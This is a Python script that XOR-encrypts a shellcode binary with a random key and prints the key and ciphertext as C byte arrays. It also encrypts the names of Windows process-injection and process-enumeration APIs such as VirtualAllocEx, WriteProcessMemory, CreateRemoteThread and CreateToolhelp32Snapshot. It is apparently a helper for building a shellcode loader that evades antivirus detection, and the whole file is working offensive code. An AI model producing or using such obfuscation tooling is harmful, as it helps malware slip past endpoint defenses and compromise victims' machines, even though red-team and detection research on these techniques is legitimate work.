import os
import sys


def generate_xor_key(length):
    return os.urandom(length)

def xor_shellcode(shellcode, key):
    return bytes(map(lambda x, y: x ^ y, shellcode, key * (len(shellcode) // len(key)) + key[:len(shellcode) % len(key)]))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python {}.py <shellcode.bin> <xor_length>".format(sys.argv[0]))
        sys.exit(1)

    try:
        with open(sys.argv[1], "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        print("File {} not found".format(sys.argv[1]))
        exit(-1)

    xor_key = generate_xor_key(int(sys.argv[2]))
    try:
        if not (os.path.exists("key.bin")):
            with open("key.bin", "wb") as f:
                f.write(xor_key)
        else:
            with open("key.bin", "rb") as f:
                xor_key = bytearray(f.read())
    except:
        print("Key file couldn't be generated")

    output = "{" + ", ".join([f"0x{byte:02X}" for byte in xor_key]) + "}"
    print(output)

    ciphered_shellcode = xor_shellcode(shellcode, xor_key)
    output = "{" + ", ".join([f"0x{byte:02X}" for byte in ciphered_shellcode]) + "}"
    print(output)

    try:
        with open("encrypted-{}".format(sys.argv[1]), "wb") as f:
            f.write(ciphered_shellcode)
    except:
        print("Could not")

    deciphered_shellcode = xor_shellcode(ciphered_shellcode, xor_key)
    output = "{" + ", ".join([f"0x{byte:02X}" for byte in deciphered_shellcode]) + "}"
    print(output)

    text_bytes = bytearray("VirtualAlloc\0", 'utf-8')
    print("{} encrypted with Key: ".format(str(text_bytes)),"{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("RtlMoveMemory\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("OpenProcess\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("VirtualAllocEx\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("WriteProcessMemory\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("VirtualProtectEx\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("CreateRemoteThread\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("CreateToolhelp32Snapshot\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("Process32FirstW\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")

    text_bytes = bytearray("Process32NextW\0", 'utf-8')
    print("{} encrypted with Key:".format(str(text_bytes)),
          "{" + ", ".join([f"0x{byte:02X}" for byte in xor_shellcode(text_bytes, xor_key)]) + "}")